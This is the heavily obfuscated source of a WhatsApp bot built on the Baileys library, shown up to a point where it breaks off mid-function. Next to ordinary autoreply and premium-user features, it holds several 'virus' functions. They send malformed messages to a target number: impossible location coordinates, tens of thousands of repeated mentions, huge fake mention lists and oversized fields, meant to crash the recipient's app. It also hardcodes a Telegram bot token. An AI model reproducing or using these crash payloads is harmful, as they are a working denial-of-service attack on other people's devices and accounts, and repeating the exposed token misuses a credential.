const {
  default: makeWASocket,
  fetchLatestBaileysVersion,
  downloadContentFromMessage,
  useMultiFileAuthState,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@adiwajshing/baileys");
const os = require('os');
const fs = require('fs');
const fsx = require("fs-extra");
const path = require("path");
const util = require("util");
const chalk = require("chalk");
const moment = require("moment-timezone");
const axios = require("axios");
const fetch = require("node-fetch");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const more = String.fromCharCode(0x200e);
const readmore = more.repeat(0xfa1);
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime
} = require("./lib/uploader");
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  addExifAvatar
} = require("./lib/converter");
const {
  smsg,
  getGroupAdmins,
  formatp,
  jam,
  formatDate,
  getTime,
  isUrl,
  await,
  sleep,
  clockString,
  msToDate,
  sort,
  toNumber,
  enumGetKey,
  runtime,
  fetchJson,
  getBuffer,
  json,
  delay,
  format,
  logic,
  generateProfilePicture,
  parseMention,
  getRandom,
  pickRandom,
  reSize
} = require('./lib/myfunc');
let afk = require('./lib/afk');
const {
  addPremiumUser,
  getPremiumExpired,
  getPremiumPosition,
  expiredCheck,
  checkPremiumUser,
  getAllPremiumUser
} = require("./lib/premiun");
const {
  fetchBuffer,
  buffergif
} = require("./lib/myfunc2");
const {
  beta1,
  beta2,
  buk1
} = require('./lib/hdr.js');
const {
  crash
} = require("./virus/crash");
const {
  buttonkal
} = require('./virus/buttonkal');
const {
  notif3
} = require("./virus/notif3");
const darkphonk = fs.readFileSync("./C-SMedia/menu.mp3");
const bug = fs.readFileSync("./C-SMedia/11.mp3");
let premium = JSON.parse(fs.readFileSync("./dtbs/premium.json"));
let _owner = JSON.parse(fs.readFileSync("./dtbs/owner.json"));
let owner = JSON.parse(fs.readFileSync("./dtbs/owner.json"));
let _afk = JSON.parse(fs.readFileSync("./dtbs/afk-user.json"));
let hit = JSON.parse(fs.readFileSync("./dtbs/total-hit-user.json"));
const VoiceNoteXeon = JSON.parse(fs.readFileSync("./dtbs/autoreply/vn.json"));
const StickerXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/sticker.json'));
const ImageCsuit = JSON.parse(fs.readFileSync("./dtbs/autoreply/image.json"));
const VideoXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/video.json'));
const DocXeon = JSON.parse(fs.readFileSync("./dtbs/autoreply/doc.json"));
const ZipXeon = JSON.parse(fs.readFileSync("./dtbs/autoreply/zip.json"));
const ApkXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/apk.json'));
const time2 = moment().tz("Ghana/Accra").format("HH:mm:ss");
if (time2 < '23:59:00') {
  var lostboytimewisher = "Good Night  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌌";
}
if (time2 < "19:00:00") {
  var lostboytimewisher = "Good Evening ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌃";
}
if (time2 < "18:00:00") {
  var lostboytimewisher = "Good Evening  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌃";
}
if (time2 < "15:00:00") {
  var lostboytimewisher = "Good Afternoon  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌅";
}
if (time2 < "11:00:00") {
  var lostboytimewisher = "Good Morning  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌄";
}
if (time2 < "05:00:00") {
  var lostboytimewisher = "Good Morning  ꉓꌗꀎꀤ꓄ USER THIS A BOT BY ᒪOᔕTᗷOY🌄";
}
module.exports = LostBoyTechInc = async (_0x239047, _0x5f530e, _0x462702, _0x12dada, _0x422212) => {
  try {
    const {
      type: _0xbb5b31,
      quotedMsg: _0x5becb4,
      mentioned: _0xbb484,
      now: _0x39738b,
      fromMe: _0x2f40e5
    } = _0x5f530e;
    var _0x40945c = _0x5f530e.mtype === "conversation" ? _0x5f530e.message.conversation : _0x5f530e.mtype == "imageMessage" ? _0x5f530e.message.imageMessage.caption : _0x5f530e.mtype == "videoMessage" ? _0x5f530e.message.videoMessage.caption : _0x5f530e.mtype == "extendedTextMessage" ? _0x5f530e.message.extendedTextMessage.text : _0x5f530e.mtype == "buttonsResponseMessage" ? _0x5f530e.message.buttonsResponseMessage.selectedButtonId : _0x5f530e.mtype == "listResponseMessage" ? _0x5f530e.message.listResponseMessage.singleSelectreplyCsuit.selectedRowId : _0x5f530e.mtype == "templateButtonreplyCsuitMessage" ? _0x5f530e.message.templateButtonreplyCsuitMessage.selectedId : _0x5f530e.mtype === 'messageContextInfo' ? _0x5f530e.message.buttonsResponseMessage?.["selectedButtonId"] || _0x5f530e.message.listResponseMessage?.["singleSelectreplyCsuit"]["selectedRowId"] || _0x5f530e.text : '';
    var _0x3a0bbf = typeof _0x5f530e.text == "string" ? _0x5f530e.text : '';
    var _0x1e0f65 = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x40945c) ? _0x40945c.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0x0] : '' : prefa ?? global.prefix;
    const _0x418bf4 = _0x40945c.replace(_0x1e0f65, '').trim().split(/ +/).shift().toLowerCase();
    const _0x4376c7 = _0x40945c.trim().split(/ +/).slice(0x1);
    const _0x19720f = _0x5f530e.pushName || "No Name";
    const _0x8a38dc = await _0x239047.decodeJid(_0x239047.user.id);
    const _0x1b540f = _0x5f530e.sender;
    const _0x208b05 = q = _0x4376c7.join(" ");
    const _0x39554b = _0x5f530e.key.remoteJid;
    const _0x20cb04 = _0x5f530e.quoted || _0x5f530e;
    const _0x50ec5a = _0x20cb04.mtype == "buttonsMessage" ? _0x20cb04[Object.keys(_0x20cb04)[0x1]] : _0x20cb04.mtype == "templateMessage" ? _0x20cb04.hydratedTemplate[Object.keys(_0x20cb04.hydratedTemplate)[0x1]] : _0x20cb04.mtype == "product" ? _0x20cb04[Object.keys(_0x20cb04)[0x0]] : _0x5f530e.quoted ? _0x5f530e.quoted : _0x5f530e;
    const _0x49e192 = (_0x50ec5a.msg || _0x50ec5a).mimetype || '';
    const _0x31f71a = _0x50ec5a.msg || _0x50ec5a;
    const _0x38cba4 = _0xbb5b31 == 'videoMessage';
    const _0x283a4e = afk.checkAfkUser(_0x5f530e.sender, _afk);
    const _0x190b37 = _0x5f530e.isGroup ? await _0x239047.groupMetadata(_0x5f530e.chat)["catch"](_0x390448 => {}) : '';
    const _0x2f93df = _0x5f530e.isGroup ? _0x190b37.subject : '';
    const _0x5ef702 = _0x5f530e.isGroup ? await _0x190b37.participants : '';
    const _0x279634 = _0x5f530e.isGroup ? await getGroupAdmins(_0x5ef702) : '';
    const _0x4f407d = _0x5f530e.isGroup ? _0x279634.includes(_0x8a38dc) : false;
    const _0x299dec = _0x5f530e.isGroup ? _0x279634.includes(_0x5f530e.sender) : false;
    const _0x5f3345 = _0x5f530e.isGroup ? _0x190b37.owner : '';
    const _0x318139 = _0x5f530e.isGroup ? (_0x5f3345 ? _0x5f3345 : _0x279634).includes(_0x5f530e.sender) : false;
    const _0x11eb7e = [ownernumber, ..._owner].map(_0x4ac60e => _0x4ac60e.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(_0x5f530e.sender);
    const _0x2fc88e = _0x11eb7e || _0x11eb7e || checkPremiumUser(_0x5f530e.sender, premium);
    expiredCheck(_0x239047, _0x5f530e, premium);
    const _0x4242ca = _0x170b69 => {
      _0x239047.sendMessage(_0x5f530e.chat, {
        'text': _0x170b69,
        'contextInfo': {
          'mentionedJid': [_0x1b540f],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': " " + global.botname,
            'body': '' + ownername,
            'previewType': "PHOTO",
            'thumbnailUrl': '',
            'thumbnail': fs.readFileSync("./C-SMedia/menu3.jpg"),
            'sourceUrl': '' + link
          }
        }
      }, {
        'quoted': _0x5f530e
      });
    };
    async function _0x26fb55(_0x4d3454) {
      return new Promise(async (_0x2544c9, _0x3727d1) => {
        if (!_0x4d3454.match(/(https:\/\/t.me\/addstickers\/)/gi)) {
          return _0x4242ca("Enther your url telegram sticker link");
        }
        packName = _0x4d3454.replace("https://t.me/addstickers/", '');
        data = await axios('https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=' + encodeURIComponent(packName), {
          'method': "GET",
          'headers': {
            'User-Agent': "GoogleBot"
          }
        });
        const _0xe388e5 = [];
        for (let _0x5fa8da = 0x0; _0x5fa8da < data.data.result.stickers.length; _0x5fa8da++) {
          fileId = data.data.result.stickers[_0x5fa8da].thumb.file_id;
          data2 = await axios("https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=" + fileId);
          result = {
            'status': 0xc8,
            'author': "LOSTBOY X LORDTECH",
            'url': 'https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/' + data2.data.result.file_path
          };
          _0xe388e5.push(result);
        }
        _0x2544c9(_0xe388e5);
      });
    }
    let _0x29f116;
    try {
      _0x29f116 = await _0x239047.profilePictureUrl(_0x5f530e.sender, 'image');
    } catch (_0x5ba86e) {
      _0x29f116 = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg';
    }
    ;
    async function _0x50fe66(_0x383274) {
      let _0x3bd94c = generateWAMessageFromContent(_0x383274, proto.Message.fromObject({
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'locationMessage': {
                  'degreesLatitude': 922.999999999999,
                  'degreesLongitude': -9229999999999.998
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': buttonkal + '.' + notif3 + '.' + crash + '.' + "@0 ".repeat(0xc350),
                'contextInfo': {
                  'mentionedJid': ["0@s.whatsapp.net"]
                }
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "0@s.whatsapp.net"),
                'groupMentions': [{
                  'groupJid': "120363301095727346@newsletter",
                  'groupSubject': " CSUIT"
                }]
              }
            }
          }
        }
      }), {
        'userJid': _0x383274
      });
      await _0x239047.relayMessage(_0x383274, _0x3bd94c.message, {});
    }
    const _0x1ad93b = {
      'key': {
        'fromMe': false,
        'participant': "0@s.whatsapp.net",
        'remoteJid': "status@broadcast"
      },
      'message': {
        'extendedTextMessage': {
          'text': 'CSUIT🏴‍☠️'
        }
      }
    };
    async function _0x41f24d(_0xe795f3) {
      await _0x239047.relayMessage(_0xe795f3, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'locationMessage': {
                  'degreesLatitude': 414058.5,
                  'degreesLongitude': 0x201be
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "CSUIT🏴‍☠️ " + "@0 ".repeat(0xc350),
                'contextInfo': {
                  'mentionedJid': ["0@s.whatsapp.net"]
                }
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "0@s.whatsapp.net"),
                'groupMentions': [{
                  'groupJid': "120363301095727346@newsletter",
                  'groupSubject': "𝐑𝐞𝐚𝐥🦣"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0xe795f3
        }
      }, {
        'messageId': null
      });
    }
    async function _0x29b414(_0x2b16e5) {
      let _0x3f8641 = generateWAMessageFromContent(_0x2b16e5, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'scheduledCallCreationMessage': {
              'scheduledTimestampMs': Date.now(),
              'hasMediaAttachment': true,
              'text': buttonkal + '.' + notif3 + '.' + crash + '.' + "@0 ".repeat(0xc350),
              'title': buttonkal + '.' + notif3 + '.' + crash + '.' + "@0 ".repeat(0xc350),
              'contextInfo': {
                'mentionedJid': ["0@s.whatsapp.net"]
              }
            },
            'nativeFlowMessage': {},
            'contextInfo': {
              'mentionedJid': Array.from({
                'length': 0x5
              }, () => "0@s.whatsapp.net"),
              'groupMentions': [{
                'groupJid': '120363301095727346@newsletter',
                'groupSubject': "CSUIT"
              }]
            }
          }
        }
      }), {
        'userJid': _0x2b16e5
      });
      await _0x239047.relayMessage(_0x2b16e5, _0x3f8641.message, {});
    }
    async function _0x34c90a(_0x23ad34) {
      await _0x239047.relayMessage(_0x23ad34, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'locationMessage': {
                  'degreesLatitude': 922.999999999999,
                  'degreesLongitude': -9229999999999.998
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': buttonkal + '.' + notif3 + '.' + crash + '.' + "@0 ".repeat(0xc350),
                'contextInfo': {
                  'mentionedJid': ["0@s.whatsapp.net"]
                }
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "0@s.whatsapp.net"),
                'groupMentions': [{
                  'groupJid': '120363301095727346@newsletter',
                  'groupSubject': " CSUIT"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x23ad34
        }
      }, {
        'messageId': null
      });
    }
    async function _0x2e0093(_0x323c6e) {
      await _0x239047.relayMessage(_0x323c6e, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'viewOnceMessage': {
                  'degreesLatitude': 0x0,
                  'degreesLongitude': 0x0
                },
                'hasMediaAttachment': false
              },
              'body': {
                'text': "CSUIT " + "@254742491666 ".repeat(0x2710),
                'contextInfo': {
                  'mentionedJid': ["254742491666@s.whatsapp.net"]
                }
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "254742491666@s.whatsapp.net"),
                'groupMentions': [{
                  'groupJid': "120363301095727346@newsletter",
                  'groupSubject': " 𝐃𝐘𝐍𝐀𝐌𝐎 🦄 "
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x323c6e
        }
      }, {
        'messageId': null
      });
    }
    async function _0x38c57b(_0x3cd15f) {
      var _0x3fca83 = generateWAMessageFromContent(_0x3cd15f, proto.Message.fromObject({
        'viewOnceMessage': {
          'key': {
            'remoteJid': "status@broadcast",
            'fromMe': false,
            'participant': "0@s.whatsapp.net"
          },
          'message': {
            'newsletterAdminInviteMessage': {
              'newsletterJid': "120363298524333143@newsletter",
              'newsletterName': '' + buttonkal,
              'jpegThumbnail': '',
              'caption': '𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉',
              'inviteExpiration': Date.now() + 0x6c258c00
            }
          }
        }
      }), {
        'userJid': _0x3cd15f
      });
      await _0x239047.relayMessage(_0x3cd15f, _0x3fca83.message, {
        'participant': {
          'jid': _0x3cd15f
        },
        'messageId': null
      });
    }
    async function _0x2844c8(_0x215ff2) {
      let _0x26d3fc = "𝐃𝐘𝐍𝐀𝐌𝐈𝐂 🦄" + 'ꦾ'.repeat(0xc350);
      let _0x1c4e88 = Array.from({
        'length': 0x88b8
      }, () => '1' + Math.floor(Math.random() * 0x7a120) + '@null');
      let _0x155aca = {
        'groupMentionedMessage': {
          'message': {
            'listResponseMessage': {
              'title': " @120363326274964194@g.us",
              'listType': "SINGLE_SELECT",
              'singleSelectReply': {
                'selectedRowId': "𝐃𝐘𝐍𝐀𝐌𝐈𝐂 🦄"
              },
              'description': " @120363326274964194@g.us",
              'contextInfo': {
                'mentionedJid': _0x1c4e88,
                'groupMentions': [{
                  'groupJid': "120363326274964194@g.us",
                  'groupSubject': _0x26d3fc
                }]
              }
            }
          }
        }
      };
      await _0x239047.relayMessage(_0x215ff2, _0x155aca, {
        'participant': {
          'jid': _0x215ff2
        }
      }, {
        'messageId': null
      });
    }
    ;
    async function _0x31d6bd(_0x2388e5, _0x1c42b9 = false) {
      await _0x239047.relayMessage(_0x2388e5, {
        'extendedTextMessage': {
          'text': "‎samMIC-V2\n" + "~@0~\n".repeat(0x7530),
          'contextInfo': {
            'mentionedJid': ["0@null", ...Array.from({
              'length': 0x3a98
            }, () => '1' + Math.floor(Math.random() * 0x7a120) + '@null')],
            'stanzaId': "1234567890ABCDEF",
            'participant': '0@null',
            'quotedMessage': {
              'callLogMesssage': {
                'isVideo': true,
                'callOutcome': '1',
                'durationSecs': '0',
                'callType': "REGULAR",
                'participants': [{
                  'jid': "0@null",
                  'callOutcome': '1'
                }]
              }
            },
            'remoteJid': _0x2388e5,
            'conversionSource': " p ",
            'conversionData': "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            'conversionDelaySeconds': 0xa,
            'forwardingScore': 0x98967f,
            'isForwarded': true,
            'quotedAd': {
              'advertiserName': " p ",
              'mediaType': "IMAGE",
              'jpegThumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              'caption': " p "
            },
            'placeholderKey': {
              'remoteJid': "0@s.whatsapp.net",
              'fromMe': false,
              'id': "ABCDEF1234567890"
            },
            'expiration': 0x15180,
            'ephemeralSettingTimestamp': "1728090592378",
            'ephemeralSharedSecret': 'ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==',
            'externalAdReply': {
              'title': '̟',
              'body': '̟',
              'mediaType': "VIDEO",
              'renderLargerThumbnail': true,
              'previewType': "VIDEO",
              'thumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              'sourceType': " p ",
              'sourceId': " p ",
              'sourceUrl': 'p',
              'mediaUrl': 'p',
              'containsAutoReply': true,
              'showAdAttribution': true,
              'ctwaClid': "ctwa_clid_example",
              'ref': "ref_example"
            },
            'entryPointConversionSource': "entry_point_source_example",
            'entryPointConversionApp': "entry_point_app_example",
            'entryPointConversionDelaySeconds': 0x5,
            'disappearingMode': {},
            'actionLink': {
              'url': 'p'
            },
            'groupSubject': " p ",
            'parentGroupJid': "6287888888888-1234567890@g.us",
            'trustBannerType': " p ",
            'trustBannerAction': 0x1,
            'issampled': false,
            'utm': {
              'utmSource': " p ",
              'utmCampaign': " p "
            },
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': "6287888888888-1234567890@g.us",
              'serverMessageId': 0x1,
              'newsletterName': " p ",
              'contentType': "UPDATE",
              'accessibilityText': " p "
            },
            'businessMessageForwardInfo': {
              'businessOwnerJid': "0@s.whatsapp.net"
            },
            'smbClientCampaignId': "smb_client_campaign_id_example",
            'smbServerCampaignId': "smb_server_campaign_id_example",
            'dataSharingContext': {
              'showMmDisclosure': true
            }
          }
        }
      }, _0x1c42b9 ? {
        'participant': {
          'jid': _0x2388e5
        }
      } : {});
      console.log(chalk.green("bot Sent Virus ✅"));
    }
    ;
    ;
    ;
    ;
    ;
    async function _0x740dec() {
      var _0x52a782 = ["《 𝕷𝖔𝖘𝖙𝖇𝖔𝖞》10%", "《 𝖝》30%", "《 𝖑𝖔𝖗𝖉 𝖙𝖊𝖈𝖍》50%", "《 =》80%", "《 𝖈𝖘𝖚𝖎𝖙》100%", "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."];
      let {
        key: _0x283f56
      } = await _0x239047.sendMessage(_0x39554b, {
        'text': 'ʟᴏᴀᴅɪɴɢ...'
      });
      for (let _0x36ec1d = 0x0; _0x36ec1d < _0x52a782.length; _0x36ec1d++) {
        await _0x239047.sendMessage(_0x39554b, {
          'text': _0x52a782[_0x36ec1d],
          'edit': _0x283f56
        });
      }
    }
    if (!_0x239047["public"]) {
      if (!_0x11eb7e && !_0x5f530e.key.fromMe) {
        return;
      }
    }
    if (autoread) {
      _0x239047.readMessages([_0x5f530e.key]);
    }
    if (global.autoTyping) {
      _0x239047.sendPresenceUpdate("composing", _0x39554b);
    }
    if (global.autoRecording) {
      _0x239047.sendPresenceUpdate('recording', _0x39554b);
    }
    _0x239047.sendPresenceUpdate('uavailable', _0x39554b);
    if (global.autorecordtype) {
      let _0xc7f787 = ['recording', "composing"];
      let _0x2f965b = _0xc7f787[Math.floor(Math.random() * _0xc7f787.length)];
      _0x239047.sendPresenceUpdate(_0x2f965b, _0x39554b);
    }
    if (autobio) {
      _0x239047.updateProfileStatus("24/7 Online Bot By " + ownername)["catch"](_0x19da31 => _0x19da31);
    }
    if (_0x5f530e.sender.startsWith('91') && global.anti91 === true) {
      return _0x239047.updateBlockStatus(_0x5f530e.sender, "block");
    }
    let _0x323bca = [];
    for (let _0x28467c of owner) {
      _0x323bca.push({
        'displayName': await _0x239047.getName(_0x28467c),
        'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:" + (await _0x239047.getName(_0x28467c)) + "\nFN:" + (await _0x239047.getName(_0x28467c)) + "\nitem1.TEL;waid=" + _0x28467c + ':' + _0x28467c + "\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:" + ytname + "\nitem2.X-ABLabel:YouTube\nitem3.URL:" + socialm + "\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;" + location + ";;;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      });
    }
    async function _0x2307bb(_0x43face) {
      return new Promise((_0x9124d, _0x193e9e) => {
        try {
          const _0x42e200 = jsobfus.obfuscate(_0x43face, {
            'compact': false,
            'controlFlowFlattening': true,
            'controlFlowFlatteningThreshold': 0x1,
            'numbersToExpressions': true,
            'simplify': true,
            'stringArrayShuffle': true,
            'splitStrings': true,
            'stringArrayThreshold': 0x1
          });
          const _0x4fbfc0 = {
            'status': 0xc8,
            'author': "LOSTBOY",
            'result': _0x42e200.getObfuscatedCode()
          };
          _0x9124d(_0x4fbfc0);
        } catch (_0x47f376) {
          _0x193e9e(_0x47f376);
        }
      });
    }
    if (_0x5f530e.message && _0x5f530e.isGroup) {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Group Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0x3a0bbf || _0x5f530e.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0x19720f), chalk.yellow(_0x5f530e.sender) + "\n" + chalk.blueBright("=> In"), chalk.green(_0x2f93df, _0x5f530e.chat));
    } else {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Private Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0x3a0bbf || _0x5f530e.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0x19720f), chalk.yellow(_0x5f530e.sender));
    }
    if (_0x418bf4) {
      const _0x15cc86 = () => {
        hit[0x0].hit_cmd += 0x1;
        fs.writeFileSync("./dtbs/total-hit-user.json", JSON.stringify(hit));
      };
      _0x15cc86();
    }
    for (let _0x54a32f of VoiceNoteXeon) {
      if (_0x3a0bbf === _0x54a32f) {
        let _0x43a9d0 = fs.readFileSync('./C-SMedia/audio/' + _0x54a32f + ".mp3");
        _0x239047.sendMessage(_0x5f530e.chat, {
          'audio': _0x43a9d0,
          'mimetype': 'audio/mp4',
          'ptt': true
        }, {
          'quoted': _0x5f530e
        });
      }
    }
    for (let _0x508cf1 of StickerXeon) {
      if (_0x3a0bbf === _0x508cf1) {
        let _0x5296e3 = fs.readFileSync("./C-SMedia/sticker/" + _0x508cf1 + ".webp");
        _0x239047.sendMessage(_0x5f530e.chat, {
          'sticker': _0x5296e3
        }, {
          'quoted': _0x5f530e
        });
      }
    }
    for (let _0xb605c1 of ImageCsuit) {
      if (_0x3a0bbf === _0xb605c1) {
        let _0x480048 = fs.readFileSync("./C-SMedia/image/" + _0xb605c1 + ".jpg");
        _0x239047.sendMessage(_0x5f530e.chat, {
          'image': _0x480048
        }, {
          'quoted': _0x5f530e
        });
      }
    }
    for (let _0x86afd8 of VideoXeon) {
      if (_0x3a0bbf === _0x86afd8) {
        let _0x15ef77 = fs.readFileSync("./C-SMedia/video/" + _0x86afd8 + ".mp4");
        _0x239047.sendMessage(_0x5f530e.chat, {
          'video': _0x15ef77
        }, {
          'quoted': _0x5f530e
        });
      }
    }
    const _0x1abedd = _0x1ef987 => {
      _0x239047.sendMessage(_0x39554b, {
        'document': _0x1ef987,
        'mimetype': "application/vnd.android.package-archive"
      }, {
        'quoted': _0x5f530e
      });
    };
    for (let _0x38c237 of ApkXeon) {
      if (_0x3a0bbf === _0x38c237) {
        let _0x5a9878 = fs.readFileSync('./C-SMedia/apk/' + _0x38c237 + ".apk");
        _0x1abedd(_0x5a9878);
      }
    }
    const _0x2dc625 = _0x2fa037 => {
      _0x239047.sendMessage(_0x39554b, {
